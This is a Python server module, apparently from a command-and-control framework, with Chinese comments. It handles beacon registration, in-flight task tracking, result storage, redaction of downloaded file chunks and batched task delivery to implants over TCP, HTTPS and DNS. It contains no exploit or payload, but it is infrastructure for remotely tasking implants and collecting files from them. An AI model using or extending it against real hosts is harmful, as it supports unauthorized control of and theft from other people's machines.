"""server/sessions/engine.py — 共享 beacon 周期逻辑（TCP/HTTPS/DNS 三传输共用）。

此前 register / 结果落库 / auto_commands / 结果处理器 在 BeaconSession 与
HTTPS/DNS 传输里各写一份，导致元数据（via/fork/shell）在非 TCP 通道丢失、
结果处理器（download 自动续传）在非 TCP 通道失效。这里收敛成单一实现。
"""

import json
import threading

from server.core.events import EVT_CONNECT, EVT_TASK_RESULT
from server.core.log import get_logger
from server.client_manager import TaskResult

logger = get_logger("beacon_engine")


class InFlight:
    """stateless 传输的任务在途登记：task_id → (client_id, result_processor, proc_arg)。

    HTTPS/DNS 是无状态轮询：task 弹出即弃，result 在后续独立请求里回来，
    需要记住每个 task 的结果处理器信息才能跑结果处理器（download 续传）。
    2026-09-04 B15: track 记录 client_id——beacon 超时清理时按 bid 清除
    该 beacon 的在途登记, 防条目永久泄漏。
    """

    def __init__(self, on_change=None):
        self._d = {}
        self._lock = threading.Lock()
        # 落盘回调(2026-09-28): 在途登记变更 → 置脏(重启后迟到结果仍能路由到处理器)
        self._on_change = on_change

    def _touch(self) -> None:
        cb = self._on_change
        if cb is None:
            return
        try:
            cb()
        except Exception:
            pass

    def snapshot(self) -> dict:
        """在途登记快照(加密落盘用)。"""
        with self._lock:
            return {k: {"client_id": v[0], "result_processor": v[1], "proc_arg": v[2]}
                    for k, v in self._d.items()}

    def apply_snapshot(self, data: dict) -> int:
        """重启恢复在途登记。返回恢复条数。"""
        n = 0
        if not isinstance(data, dict):
            return 0
        with self._lock:
            for tid, item in data.items():
                if not isinstance(tid, str) or not isinstance(item, dict):
                    continue
                if tid in self._d:
                    continue
                self._d[tid] = (str(item.get("client_id") or ""),
                                str(item.get("result_processor") or ""),
                                str(item.get("proc_arg") or ""))
                n += 1
        return n

    def track(self, task, client_id: str = "") -> None:
        """登记"已下发未回收"的任务:task_id → (bid, 结果处理器, 处理器参数)。

        2026-09-28: 不再只登记带结果处理器的任务 —— **全部已下发任务**都登记。
        原语义只服务 download 续传;现在多一层用途:重启后据此列出"重启前已下发
        但结果未知"的任务(用户要求不静默消失),并在 beacon 超时清理时一并回收。
        """
        with self._lock:
            self._d[task.task_id] = (client_id,
                                     getattr(task, "result_processor", "") or "",
                                     getattr(task, "proc_arg", "") or "")
        self._touch()

    def take(self, task_id: str) -> tuple:
        with self._lock:
            v = self._d.pop(task_id, None)
        if not v:
            return "", ""
        self._touch()
        return v[1], v[2]

    def remove_client(self, client_id: str) -> None:
        """清除某 beacon 的全部在途登记(超时清理时调用)。"""
        with self._lock:
            stale = [k for k, v in self._d.items() if v[0] == client_id]
            for k in stale:
                del self._d[k]
            if not stale:
                return
        self._touch()


def register_beacon(reg: dict, mgr, events) -> tuple:
    """注册 + via/fork/shell 标记 + 上线事件。返回 (client_id, is_new)。"""
    client_id = reg["id"]
    via = reg.get("via", "")
    is_fork = bool(reg.get("fork", False))
    is_shell = bool(reg.get("shell", False))
    client_id, is_new = mgr.register(client_id, is_client=False)
    rec = mgr.get_client(client_id)
    if rec:
        rec.via = via            # 无条件覆盖：直连注册帧无 via → 清空（准确反映当前通道）
        if is_fork:
            rec.is_fork = True
        rec.is_shell = is_shell
        rec.running_tasks = list(reg.get("running") or [])  # 植入物上报的运行中任务
        rec.active += 1     # 会话计数(B15): 重叠会话各自 +1, close 各 -1
    events.emit(EVT_CONNECT, client_id, first=bool(is_new), via=via or None,
                fork=is_fork or None, shell=is_shell or None)
    return client_id, is_new


def _redact_binary(output: str) -> str:
    """展示/落库副本里去掉二进制载荷(download 的分块 base64)。

    download 模块回传 {"chunk":n,"total":m,"data":"<base64>","path":..} —— 原始内容
    仍原样交给结果处理器(download_parse 落盘), 但**结果列表/事件/控制台只留摘要**,
    否则每下载一个文件就往屏幕刷一屏 base64(2026-09-28 用户要求去除)。
    """
    if len(output) < 512:
        return output
    try:
        d = json.loads(output)
    except ValueError:
        return output
    if isinstance(d, dict) and isinstance(d.get("data"), str) and len(d["data"]) > 512:
        d["data"] = f"<已省略 {len(d['data'])} 字符 base64 二进制块(已交服务端落盘)>"
        return json.dumps(d, ensure_ascii=False)
    return output


def store_result(client_id, task_id, output, error, mgr, events,
                 max_result_size, smods=None, dispatcher=None,
                 result_processor="", proc_arg="", overwrite=False):
    """结果截断 + 落库 + 事件 + 结果处理器（三传输共用）。

    注意: add_result 按 task_id 去重——重复上报(ACK 丢失后 implant 重发)
    返回 False,此时**跳过事件与结果处理器**:处理器(如 download_parse 按
    chunk 追加写盘)对重复结果重复执行会造成文件损坏/任务重复入队,
    去重必须同时护住副作用(2026-09-04 修复)。
    """
    if len(output) > max_result_size:
        output = (output[:max_result_size]
                  + f"\n... (truncated, {len(output)} bytes total)")
    if len(error) > max_result_size:
        # 2026-09-04 B15: error 与 output 同步截断(此前只截 output,
        # 超长 traceback 能撑爆结果存储/前端渲染)
        error = (error[:max_result_size]
                 + f"\n... (truncated, {len(error)} bytes total)")
    # D(2026-09-28):落库/展示用摘要副本(去掉 base64 大块),原始内容只给结果处理器
    stored_output = _redact_binary(output)
    if overwrite:
        # 交互式 shell 每轮回连覆盖上报累积输出:内容未变则不重复落库/发事件
        # (否则控制台每轮重印整段输出刷屏——2026-09-28 修复)
        prev = mgr.result_output(client_id, task_id)
        if prev is not None and prev == (stored_output, error):
            return
    added = mgr.add_result(client_id, TaskResult(task_id=task_id,
                                                 output=stored_output,
                                                 error=error), overwrite=overwrite)
    if not added:
        return  # 重复结果: 静默丢弃(不入事件、不跑结果处理器)
    # C(2026-09-28):事件只记元数据(不再写 output 内容)——事件文件是明文,
    # 写内容会让"结果加密落盘"漏成明文;完整输出在内存/加密状态文件里。
    events.emit(EVT_TASK_RESULT, client_id, task_id=task_id,
                ok=not error, out_len=len(output), err_len=len(error))
    if result_processor and smods is not None:
        try:
            out = smods.run(result_processor,
                            [output, error, proc_arg, dispatcher, client_id])
        except Exception as e:
            logger.warning("result processor %s failed: %s",
                           result_processor, e)
            return
        try:
            fields = json.loads(out)
        except ValueError:
            return
        if isinstance(fields, dict) and fields:
            mgr.update_metadata(client_id, fields)


def build_auto_tasks(commands, client_id, dispatcher) -> list:
    """把 auto_commands 配置构建成任务列表（构建失败告警跳过）。"""
    tasks = []
    if not commands or not dispatcher:
        return tasks
    for cmd_str in commands:
        cmd_str = cmd_str.strip()
        if not cmd_str:
            continue
        parts = cmd_str.split()
        name, args = parts[0], parts[1:]
        try:
            task = dispatcher.build_task_for(client_id, name, args)
        except ValueError as e:
            logger.warning("auto command '%s' build failed: %s", name, e)
            continue
        if task is None:
            logger.warning("auto command module not found: %s", name)
            continue
        tasks.append(task)
    return tasks


def take_task_batch(client_id: str, tq, budget: int) -> list:
    """按字节预算弹出一批任务（超预算的任务放回队头,下次再取）。

    TCP 批量会话与无状态中继(agent_http/https/dns)共用:每次会话只取
    一批、发一帧——剩余任务留在队列,下次回连再拉(旧 drain 全量+拆帧
    在多帧场景丢任务,2026-08-27 修复)。
    预算近似 = task_id + code 长度 + 帧开销余量。
    """
    tasks, size = [], 0
    while True:
        t = tq.pop(client_id)
        if t is None:
            return tasks
        approx = len(getattr(t, "task_id", "")) + len(getattr(t, "code", "")) + 64
        if tasks and size + approx > budget:
            tq.push_front(client_id, t)
            return tasks
        tasks.append(t)
        size += approx


def pack_tasks_batch(tasks, budget: int) -> list:
    """按字节预算把任务列表拆成多批（每批 = 原 Task 对象列表）。

    预算近似 = task_id + code 长度 + 帧开销余量;超预算拆批,防单帧超限。
    返回批次列表,每批仍是 Task 对象(重发时可直接 push_front 原对象)。
    """
    batches, cur, size = [], [], 0
    for t in tasks:
        approx = len(getattr(t, "task_id", "")) + len(getattr(t, "code", "")) + 64
        if cur and size + approx > budget:
            batches.append(cur)
            cur, size = [], 0
        cur.append(t)
        size += approx
    if cur:
        batches.append(cur)
    return batches


def batch_response(acked: list, tasks: list, budget: int) -> list:
    """构造批量下发帧载荷列表: [{tasks: [...], acked: [...]}, ...]（按预算分批）。

    acked 只携带在首批(implant 端收到任意帧的 acked 即清理本地结果)。
    """
    frames = []
    if not tasks:
        return [{"tasks": [], "acked": list(acked)}]
    first = True
    for batch in pack_tasks_batch(tasks, budget):
        frames.append({
            "tasks": [
                {"task_id": t.task_id, "code": t.code,
                 **({"init": True} if getattr(t, "is_init", False) else {}),
                 **({"record": True} if getattr(t, "record", False) else {})}
                for t in batch],
            "acked": list(acked) if first else [],
        })
        first = False
    return frames
